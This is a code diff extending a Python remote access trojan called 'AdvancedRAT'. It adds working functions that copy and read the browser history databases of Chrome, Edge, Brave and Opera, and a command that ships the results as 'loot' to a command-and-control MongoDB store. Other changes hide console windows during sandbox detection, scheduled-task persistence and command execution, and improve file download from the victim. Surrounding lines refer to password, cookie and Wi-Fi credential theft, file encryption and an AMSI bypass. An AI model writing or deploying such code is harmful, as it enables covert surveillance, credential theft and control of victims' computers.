@@ -85,6 +85,128 @@ class BrowserManager:
     """Handle browser data extraction (passwords, history, cookies)"""
     
     @staticmethod
+    def get_history(limit=1000):
+        """Extract browser history from all supported browsers"""
+        all_history = []
+        
+        if IS_WINDOWS:
+            browsers = {
+                'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
+                'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
+                'Brave': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'BraveSoftware\Brave-Browser\User Data'),
+                'Opera': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera Stable'),
+                'Opera GX': os.path.join(os.environ.get('APPDATA', ''), r'Opera Software\Opera GX Stable')
+            }
+            
+            for name, path in browsers.items():
+                if os.path.exists(path):
+                    try:
+                        res = BrowserManager._steal_history_windows(name, path, limit)
+                        all_history.extend(res)
+                    except: pass
+        
+        elif IS_LINUX or IS_MAC:
+            browsers = {
+                'Chrome': os.path.expanduser('~/.config/google-chrome'),
+                'Chromium': os.path.expanduser('~/.config/chromium'),
+                'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
+                'Opera': os.path.expanduser('~/.config/opera')
+            }
+            
+            for name, path in browsers.items():
+                if os.path.exists(path):
+                    try:
+                        res = BrowserManager._steal_history_linux(name, path, limit)
+                        all_history.extend(res)
+                    except: pass
+                    
+        return all_history
+
+    @staticmethod
+    def _steal_history_windows(browser_name, user_data_path, limit):
+        history = []
+        profiles = ['Default', 'Guest Profile']
+        for i in range(1, 10): profiles.append(f'Profile {i}')
+        if "Opera" in browser_name:
+            profiles = ['']
+            
+        for profile in profiles:
+            history_path = os.path.join(user_data_path, profile, "History")
+            if not os.path.exists(history_path): continue
+            
+            temp_db = os.path.join(tempfile.gettempdir(), f"hi_{random.randint(1000, 9999)}.db")
+            try:
+                shutil.copy2(history_path, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
+                for url, title, visit_count, last_visit_time in cursor.fetchall():
+                    last_visit = "0"
+                    if last_visit_time > 0:
+                        try:
+                            last_visit = datetime.fromtimestamp((last_visit_time / 1000000) - 11644473600).strftime('%Y-%m-%d %H:%M:%S')
+                        except:
+                            last_visit = str(last_visit_time)
+                    history.append({
+                        'browser': browser_name,
+                        'profile': profile or 'Default',
+                        'url': url,
+                        'title': title,
+                        'visits': visit_count,
+                        'last_visit': last_visit
+                    })
+                conn.close()
+            except Exception as e:
+                pass
+            finally:
+                if os.path.exists(temp_db):
+                    try: os.remove(temp_db)
+                    except: pass
+        return history
+
+    @staticmethod
+    def _steal_history_linux(browser_name, user_data_path, limit):
+        history = []
+        profiles = ['Default']
+        for i in range(1, 10): profiles.append(f'Profile {i}')
+        if "Opera" in browser_name:
+            profiles = ['']
+            
+        for profile in profiles:
+            history_path = os.path.join(user_data_path, profile, "History")
+            if not os.path.exists(history_path): continue
+            
+            temp_db = os.path.join(tempfile.gettempdir(), f"hi_{random.randint(1000, 9999)}.db")
+            try:
+                shutil.copy2(history_path, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
+                for url, title, visit_count, last_visit_time in cursor.fetchall():
+                    last_visit = "0"
+                    if last_visit_time > 0:
+                        try:
+                            last_visit = datetime.fromtimestamp((last_visit_time / 1000000) - 11644473600).strftime('%Y-%m-%d %H:%M:%S')
+                        except:
+                            last_visit = str(last_visit_time)
+                    history.append({
+                        'browser': browser_name,
+                        'profile': profile or 'Default',
+                        'url': url,
+                        'title': title,
+                        'visits': visit_count,
+                        'last_visit': last_visit
+                    })
+                conn.close()
+            except Exception as e:
+                pass
+            finally:
+                if os.path.exists(temp_db):
+                    try: os.remove(temp_db)
+                    except: pass
+        return history
+
+    @staticmethod
     def get_passwords():
         """Extract passwords from all supported browsers"""
         all_passwords = []
@@ -872,7 +994,7 @@ class AntiSandbox:
             vm_elements = ['vboxguest', 'vboxservice', 'vmtoolsd', 'vmmemctl', 'qemu-ga']
             if IS_WINDOWS:
                 # Check for common VM vendor IDs
-                o = subprocess.check_output('wmic baseboard get manufacturer', shell=True).decode().lower()
+                o = subprocess.check_output('wmic baseboard get manufacturer', shell=True, creationflags=0x08000000).decode().lower()
                 if any(x in o for x in ['microsoft', 'vmware', 'virtualbox', 'qemu']): return True
             elif IS_LINUX:
                 # Check dmesg or modules
@@ -1333,7 +1455,7 @@ $watcher.Stop()
                 if PrivilegeManager.is_admin():
                     task_cmd += ' /rl highest'
                     
-                subprocess.run(task_cmd, shell=True, capture_output=True)
+                subprocess.run(task_cmd, shell=True, capture_output=True, creationflags=0x08000000)
                 results.append("Scheduled Task created")
             except Exception as e:
                 results.append(f"Schtasks failed: {str(e)}")
@@ -1679,7 +1801,8 @@ class CommandExecutor:
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
                 cwd=cwd or os.getcwd(),
-                start_new_session=not IS_WINDOWS # Linux: separate session group
+                start_new_session=not IS_WINDOWS, # Linux: separate session group
+                creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
             )
             
             # Register process
@@ -1831,6 +1954,7 @@ class AdvancedRAT:
             'wifi_passwords': self._handle_wifi_passwords,
             'browser_passwords': self._handle_browser_passwords,
             'browser_cookies': self._handle_browser_cookies,
+            'browser_history': self._handle_browser_history,
             'chromelevator': self._handle_chromelevator,
             'file_crypt': self._handle_file_crypt,
             'amsi_bypass': self._handle_amsi_bypass,
@@ -2026,11 +2150,14 @@ class AdvancedRAT:
                 if hasattr(self, 'mongodb_client'):
                     db = self.mongodb_client.get_database('c2_database')
                     ts = datetime.datetime.now().isoformat()
+                    # Base64-encode bytes so pymongo can store them as a plain string.
+                    # Raw bytes objects cause a TypeError in pymongo without bson.Binary.
+                    encoded_data = base64.b64encode(data).decode() if isinstance(data, bytes) else (data or '')
                     db.loot.insert_one({
                         "client_id": self.client_id,
                         "type": loot_type,
                         "filename": filename or f"unnamed_{int(time.time())}",
-                        "data": data,
+                        "data": encoded_data,
                         "timestamp": ts,
                         "size": len(data) if data else 0
                     })
@@ -3961,8 +4088,12 @@ class AdvancedRAT:
         """Download file from victim"""
         filepath = cmd.get('path', '')
         
+        # Support relative paths using the current shell working directory
+        if not os.path.isabs(filepath):
+            filepath = os.path.join(self.shell_cwd, filepath)
+            
         if not os.path.exists(filepath):
-            return {'error': 'File not found'}
+            return {'error': f'File not found: {filepath}'}
         
         try:
             with open(filepath, 'rb') as f:
@@ -4814,6 +4945,47 @@ pty.spawn("/bin/sh")
                 'success': True,
                 'data': report_data,
                 'count': len(passwords)
+            }
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_browser_history(self, cmd):
+        """Dump browser history and send as loot or directly in response"""
+        try:
+            limit = cmd.get('limit', 1000)
+            history = BrowserManager.get_history(limit)
+            
+            if not history:
+                return {'success': True, 'message': 'No history found or browsers not detected', 'count': 0}
+                
+            report_data = {
+                'metadata': {
+                    'extracted_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'system': platform.node(),
+                    'user': getpass.getuser(),
+                    'count': len(history)
+                },
+                'history': history
+            }
+            
+            report_json = json.dumps(report_data, indent=2)
+            filename = f"browser_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+            
+            submit_as_loot = cmd.get('as_file', True) or len(history) > 100
+            
+            if submit_as_loot:
+                self._send_loot('history', report_json.encode(), filename)
+                return {
+                    'success': True,
+                    'status': 'sent_as_loot',
+                    'filename': filename,
+                    'count': len(history)
+                }
+                
+            return {
+                'success': True,
+                'data': report_data,
+                'count': len(history)
             }
         except Exception as e:
             return {'error': str(e)}
